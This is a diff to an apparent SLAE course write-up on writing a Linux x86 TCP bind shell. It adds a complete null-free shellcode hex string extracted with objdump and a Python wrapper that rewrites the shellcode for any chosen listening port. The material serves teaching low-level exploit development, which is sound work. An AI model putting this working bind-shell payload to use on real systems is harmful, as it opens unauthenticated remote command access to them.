@@ -594,7 +594,7 @@ Before placing the string '/bin/sh' onto the stack (reverse order), it is import
 
 To ensure that the string is divisible by 4, an additional character '/' is added to increase the characters from 7 to 8 resulting in '//bin/sh'.
 
-Python can be used to extract the hex address, along with splitting up the string into 4 byte halves to have a clean hex address to use for the calls:
+Python can be used to interpret and extract the hex address, along with splitting up the string into 4 byte halves to have a clean hex address to use for the calls:
 
 ```python
 osboxes@osboxes:~/Downloads/SLAE$ python
@@ -800,14 +800,38 @@ $ id
 uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
 ```
 
-Objdump is used to extract the shellcode from the TCP bind shell in hex format:
+Objdump is used to extract the shellcode from the TCP bind shell in hex format (Null free):
 
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./shell_bind_tcp|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\xb0\x66\x89\xfb\x31\xc9\x51\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x31\xff\x89\xc7\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 ```
 
-... then python wrapper ... then POC once more ... 
+Once the raw shellcode has been extracted, the last requirement to complete the assignment is to ensure the port number is easily configurable. 
+
+This can be achieved by utilising a Python wrapper which takes a standard 2 byte port number, and dynamically generates shellcode based on the user input (reference below includes the original hardcoded shellcode for port 4444):
+
+```python
+import socket
+import sys
+
+shellcode = """
+\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\xb0\\x66\\x89
+\\xfb\\x31\\xc9\\x51\\x51\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b
+\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80
+\\x31\\xff\\x89\\xc7\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e
+\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80
+"""
+
+if len(sys.argv) < 2:
+    print 'Usage: python {name} [port_to_bind]'.format(name = sys.argv[0])
+    exit(1)
+
+port = hex(socket.htons(int(sys.argv[1])))
+shellcode = shellcode.replace("\\x11\\x5c", "\\x{b1}\\x{b2}".format(b1 = port[4:6], b2 = port[2:4]))
+```
+
+compile and execute ... 
 
 ##### SLAE Disclaimer ####
 ---------
